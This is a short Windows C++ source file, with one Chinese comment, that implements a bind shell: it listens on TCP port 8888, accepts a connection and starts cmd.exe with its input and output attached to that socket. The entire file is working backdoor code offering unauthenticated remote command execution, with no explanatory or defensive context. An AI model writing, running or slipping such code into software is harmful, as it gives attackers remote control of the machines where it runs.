#define _WINSOCK_DEPRECATED_NO_WARNINGS 1
#include <winsock2.h>
#include <Windows.h>
#pragma comment(lib,"ws2_32.lib")
int main11354(void)
{
	//初始化网络环境
	WSADATA wsaData{};
	WSAStartup(0x0202, &wsaData);

	SOCKET socket = 0;
	socket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

	SOCKADDR_IN serverAddr;
	serverAddr.sin_addr.S_un.S_addr = INADDR_ANY;
	serverAddr.sin_port = htons(8888);
	serverAddr.sin_family = AF_INET;

	bind(socket, (LPSOCKADDR)&serverAddr, sizeof(SOCKADDR_IN));

	listen(socket, SOMAXCONN);
	socket = accept(socket,0, 0);

	PROCESS_INFORMATION pInfo{};
	STARTUPINFOA sInfo{}; //0x44

	sInfo.cb = sizeof(STARTUPINFOA);
	sInfo.dwFlags = STARTF_USESTDHANDLES;
	sInfo.hStdInput = (HANDLE)socket;
	sInfo.hStdOutput = (HANDLE)socket;
	sInfo.hStdError = (HANDLE)socket;

	BOOL isSuccess = CreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, TRUE, 0, 0, 0, &sInfo, &pInfo);

	CloseHandle(pInfo.hProcess);
	CloseHandle(pInfo.hThread);
	return 0;
}